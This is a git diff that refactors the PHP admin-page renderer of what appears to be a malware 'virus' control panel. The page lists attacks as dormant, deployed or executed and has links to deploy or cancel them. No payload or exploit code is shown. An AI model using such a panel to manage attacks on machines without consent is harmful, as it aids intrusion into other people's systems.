@@ -2,35 +2,43 @@
 
 namespace Kelvinho\Virus\Attack;
 
-use Kelvinho\Virus\Header;
-use Kelvinho\Virus\HtmlTemplate;
-use Kelvinho\Virus\Logs;
-use Kelvinho\Virus\Session;
-use Kelvinho\Virus\Timezone;
-use Kelvinho\Virus\User;
+use Kelvinho\Virus\Singleton\Header;
+use Kelvinho\Virus\Singleton\HtmlTemplate;
+use Kelvinho\Virus\Singleton\Logs;
+use Kelvinho\Virus\Session\Session;
+use Kelvinho\Virus\Singleton\Timezone;
+use Kelvinho\Virus\User\UserFactory;
 use function Kelvinho\Virus\formattedTime;
 
 /**
- * Class Renderer, renders admin pages for attacks. Currently, these UI files can be defined:
+ * Class AttackRenderer, renders admin pages for attacks. Currently, these UI files can be defined (but not required to):
  *
- * - fields.php
- * - result.php
- * - footnote.php
- * - fields_js.php
- * - js.php
- * - message_dormant
- * - message_deployed
- * - message_executed
+ * - fields.php: handle extra input fields that you might want to configure
+ * - fields_js.php: should cite a bunch of field values defined in fields.php. Please see existing packages for examples
+ * - footnote.php: footnote, is placed at the very last line of body. Can be used as a long explanation area
+ * - js.php: extra javascript. This is placed inside the html tag, meaning you have to wrap this around <scrip> tag
+ * - message_dormant: extra message when the attack is dormant
+ * - message_deployed: extra message when the attack is deployed
+ * - message_executed: extra message when the attack is executed
  *
  * @package Kelvinho\Virus\Attack
+ * @author Quang Ho <157239q@gmail.com>
+ * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
+ * @license http://www.opensource.org/licenses/mit-license.html  MIT License
  */
-class Renderer {
-    public static function render(string $packageDirectory, Session $session, AttackFactory $attackFactory) {
+class AttackRenderer {
+    /**
+     * Renders the admin page
+     *
+     * @param AttackBase $attack The attack
+     * @param Session $session System Session singleton
+     */
+    public static function render(AttackBase $attack, Session $session, UserFactory $userFactory) {
+        $packageDirectory = PackageRegistrar::getLocation($attack->getPackageDbName());
         if (!$session->has("attack_id")) {
             header("Location: " . DOMAIN);
             Header::redirect();
         }
-        $attack = $attackFactory->get($session->get("attack_id"));
         ?>
         <html lang="en_US">
         <head>
@@ -64,8 +72,8 @@ class Renderer {
         <label>
             Status
             <input class="w3-input" type="text" disabled value="<?php echo $attack->getStatus();
-            if ($attack->getStatus() === AttackInterface::STATUS_EXECUTED) {
-                $user = User::get($session->get("user_handle"));
+            if ($attack->getStatus() === AttackBase::STATUS_EXECUTED) {
+                $user = $userFactory->get($session->get("user_handle"));
                 echo " at " . formattedTime($attack->getExecutedTime() + Timezone::getUnixOffset($user->getTimezone())) . " UTC " . $user->getTimezone();
             } ?>">
         </label>
@@ -77,20 +85,20 @@ class Renderer {
         <div class="w3-button w3-red" onclick="update()">Update</div>
         <?php
         switch ($attack->getStatus()) {
-            case AttackInterface::STATUS_DORMANT: ?>
+            case AttackBase::STATUS_DORMANT: ?>
                 <p>This attack is dormant. Click <a onclick="deployAttack()" class="link">here</a> to deploy.</p>
                 <?php @include($packageDirectory . "/ui/message_dormant.php");
                 break;
-            case AttackInterface::STATUS_DEPLOYED: ?>
+            case AttackBase::STATUS_DEPLOYED: ?>
                 <p>This attack is deployed. Click <a onclick="cancelAttack()" class="link">here</a> to cancel the
                     attack.</p>
                 <?php @include($packageDirectory . "/ui/message_deployed.php");
                 break;
-            case AttackInterface::STATUS_EXECUTED:
+            case AttackBase::STATUS_EXECUTED:
                 @include $packageDirectory . "/ui/message_executed.php";
                 break;
             default:
-                Logs::attackStatus($attack->getStatus());
+                Logs::error("Attack status of " . $attack->getStatus() . " is not defined. This really should not happen at all and please dig into it immediately.");
         }
         @include($packageDirectory . "/ui/footnote.php");
         ?>
